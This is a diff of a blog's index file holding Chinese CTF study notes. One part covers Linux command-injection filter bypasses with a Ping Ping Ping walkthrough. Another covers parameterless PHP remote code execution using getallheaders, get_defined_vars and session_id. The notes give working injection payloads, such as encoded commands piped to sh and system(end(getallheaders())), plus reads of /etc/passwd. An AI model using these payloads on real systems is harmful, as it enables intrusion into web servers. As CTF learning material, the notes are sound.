+<p>只有在 || 左边的命令返回假（命令返回值 $? &#x3D;&#x3D; 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</p>
+<p>只要有一个命令返回真（命令返回值 $? &#x3D;&#x3D; 0），后面的命令就不会被执行。直到返回真的地方停止执行。</p>
+<p>举例，ping命令判断存活主机，注意 &amp;&gt;要连起来写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1    if [ &quot;$result&quot; == 0 ];then    echo &quot;192.168.1.1 is UP!&quot;     else    echo &quot;192.168.2.1 is DOWN!&quot;   fi</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>linux下绕过空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br></pre></td></tr></table></figure>
+
+<h3 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h3><p><code>???</code>在linux里面可以进行代替字母</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/c?t flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>*</code>在linux里面可以进行模糊匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag.* *</span><br></pre></td></tr></table></figure>
+
+<p>进行模糊匹配php</p>
+<h3 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤<code>cat</code></h3><p><code>cat</code>：由第一行开始显示内容，并将所有内容输出</p>
+<p><code>tac</code>：从最后一行倒序显示内容，并将所有内容输出</p>
+<p><code>more</code>：根据窗口大小，一页一页的现实文件内容</p>
+<p><code>less</code>和<code>more</code>类似，但其优点可以往前翻页，而且进行可以搜索字符</p>
+<p><code>head</code>：只显示头几行</p>
+<p><code>tail</code>：只显示最后几行</p>
+<p><code>nl</code>：类似于cat -n，显示时输出行号</p>
+<p><code>tailf</code>：类似于tail -f</p>
+<p><code>sort%20/flag</code> 读文件</p>
+<p><code>dir</code> 来查看当前目录文件</p>
+<p>也可以<code>c\at</code></p>
+<h3 id="Linux花式读取文件内容"><a href="#Linux花式读取文件内容" class="headerlink" title="Linux花式读取文件内容"></a>Linux花式读取文件内容</h3><p>ps:目标是获取flag.txt的内容</p>
+<h4 id="static-sh读取文件"><a href="#static-sh读取文件" class="headerlink" title="static-sh读取文件"></a><code>static-sh</code>读取文件</h4><p><code>static-sh ./flag.txt</code>等同于<code>/???/??????-?? ./flag.txt</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">static-sh ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br><span class="line"><span class="comment"># 等同于</span></span><br><span class="line">/<span class="string">??</span><span class="string">?/</span><span class="string">??</span><span class="string">??</span><span class="string">??</span>-<span class="string">??</span> ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">./flag.<span class="symbol">txt:</span> line <span class="number">1</span>: flag&#123;this_is_a_test&#125;: <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
+
+<h4 id="paste读取文件"><a href="#paste读取文件" class="headerlink" title="paste读取文件"></a><code>paste</code>读取文件</h4><p><code>paste ./flag.txt /etc/passwd</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">paste ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">flag&#123;this_is_a_test&#125;    <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">        <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">        <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line">/<span class="regexp">/省略</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="diff读取文件"><a href="#diff读取文件" class="headerlink" title="diff读取文件"></a><code>diff</code>读取文件</h4><p><code>diff ./flag.txt /etc/passwd</code></p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">diff ./flag.txt /etc/passwd</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">1c1,<span class="number">45</span></span><br><span class="line">&lt; flag&#123;this_is_a_test&#125;</span><br><span class="line">\ <span class="title class_">No</span> newline at <span class="keyword">end</span> of file</span><br><span class="line">---</span><br><span class="line">&gt; <span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line">&gt; <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">&gt; <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="od读取文件"><a href="#od读取文件" class="headerlink" title="od读取文件"></a><code>od</code>读取文件</h4><p><code>od -a ./flag.txt</code></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">od -<span class="selector-tag">a</span> ./flag<span class="selector-class">.txt</span></span><br><span class="line">#输出结果：</span><br><span class="line"><span class="number">0000000</span>   f   l   <span class="selector-tag">a</span>   g   &#123;   t   h   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">i</span>   s   _   <span class="selector-tag">a</span>   _   t</span><br><span class="line"><span class="number">0000020</span>   e   s   t   &#125;</span><br><span class="line"><span class="number">0000024</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="bzmore读取文件"><a href="#bzmore读取文件" class="headerlink" title="bzmore读取文件"></a><code>bzmore</code>读取文件</h4><p><code>bzmore ./flag.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bzmore ./flag.txt</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------</span><br><span class="line">flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="bzless读取文件"><a href="#bzless读取文件" class="headerlink" title="bzless读取文件"></a><code>bzless</code>读取文件</h4><p><code>bzless ./flag.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `bzless ./flag.txt`</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">------&gt; ./flag.txt &lt;------ flag&#123;this_is_a_test&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> YWJjZGU=|base64 -d </span><br><span class="line">    <span class="comment">//打印出来abcde</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|bash </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br><span class="line"><span class="keyword">echo</span> Y2F0IGZsYWcucGhw|base64 -d|sh </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">63617420666</span>c61672e706870 | xxd -r -p|bash <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(printf “\<span class="number">154</span>\<span class="number">163</span>”) </span><br><span class="line">    <span class="comment">//ls</span></span><br><span class="line">$(printf “\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”) </span><br><span class="line">    <span class="comment">//cat flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤;"></a>过滤<code>;</code></h3><h2 id="例题及详解"><a href="#例题及详解" class="headerlink" title="例题及详解"></a>例题及详解</h2><p>[GXYCTF2019]Ping Ping Ping</p>
+<p><img src="https://s2.loli.net/2023/11/20/mJixQ7jw4ukMNZn.png" alt="image-20231103224815525"></p>
+<p>打开靶机，发现提示用GET方法进行Ping命令注入</p>
+<p>构造<code>?ip=127.0.0.1;ls</code></p>
+<p><img src="https://s2.loli.net/2023/11/20/O9nWgscwGiC2Ldp.png" alt="image-20231103224922092"></p>
+<p>发现两个php文件</p>
+<p>构造<code>?ip=127.0.0.1;cat index.php</code>（一般题目不会直接让你出flag，估计里面是各种过滤）</p>
+<p><img src="https://s2.loli.net/2023/11/20/Z9PV3Ws8LJag6Kc.png" alt="image-20231103225231785"></p>
+<p>发现空格被过滤，用<code>$IFS$1</code>绕过，但是无回显</p>
+<p><img src="https://s2.loli.net/2023/11/20/uHCFWkieYcdxE4r.png" alt="image-20231103225717344"></p>
+<p>总结：过滤的特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
+
+<p>flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>但仔细观察源码发现有一个$a变量可以覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php	没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php  	过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php	有flag</span><br><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>
+
+<p>变量替换顺序，效果也不一样</p>
+<h3 id="简单变量替换，用-a覆盖拼接flag"><a href="#简单变量替换，用-a覆盖拼接flag" class="headerlink" title="简单变量替换，用$a覆盖拼接flag"></a>简单变量替换，用$a覆盖拼接flag</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br><span class="line">查看源码</span><br></pre></td></tr></table></figure>
+
+<h3 id="变量ab互换传递，绕过字符串匹配，实现拼接"><a href="#变量ab互换传递，绕过字符串匹配，实现拼接" class="headerlink" title="变量ab互换传递，绕过字符串匹配，实现拼接"></a>变量ab互换传递，绕过字符串匹配，实现拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="被过滤的bash，用管道-sh替换"><a href="#被过滤的bash，用管道-sh替换" class="headerlink" title="被过滤的bash，用管道+sh替换"></a>被过滤的bash，用管道+sh替换</h3><p><code>cat flag.php</code>用base64加密来绕过正则匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br></pre></td></tr></table></figure>
+
+<p>过滤了flag、bash，但sh没过滤，linux下可用sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
+
+<p><code>|sh</code> 就是执行前面的echo脚本</p>
+<h3 id="类似题的大概思路"><a href="#类似题的大概思路" class="headerlink" title="类似题的大概思路"></a>类似题的大概思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl&#x27;&#x27;ag.php        两个单引号绕过</span><br><span class="line">echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      </span><br><span class="line">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       </span><br><span class="line">//hex编码绕过(引号可以去掉)</span><br><span class="line"></span><br><span class="line">echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     </span><br><span class="line">//sh的效果和bash一样</span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a$b          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </span><br></pre></td></tr></table></figure>
+
+<p>通配符</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*       <span class="comment">#匹配全部字符，通配符</span></span><br><span class="line">?       <span class="comment">#任意一个字符，通配符</span></span><br><span class="line">[]      <span class="comment">#表示一个范围（正则，通配符）</span></span><br><span class="line">&#123;&#125;      <span class="comment">#产生一个序列（通配符）</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/20/2UfKa9yFiozxOg8.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+        <tag>Ping</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>包含临时文件学习记录</title>
     <url>/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h1><h2 id="php文件上传特性"><a href="#php文件上传特性" class="headerlink" title="php文件上传特性"></a>php文件上传特性</h2><p><img src="https://s2.loli.net/2023/11/18/5AgRPFiqI4KeX3a.png" alt="img"></p>
@@ -851,6 +851,114 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>无参数RCE学习记录</title>
+    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
+    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>
+
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
+<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
+<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
+<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
+<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
+<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
+<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
+<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>
+
+<p>将数组倒置取第一个元素相当于<code>end()</code></p>
+<p>小小举个例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
+<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
+<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
+<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
+<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
+<p>我们还可以用以下方法得到全局变量的值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
+<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
+<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
+<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
+<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
+<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
+<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
+<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
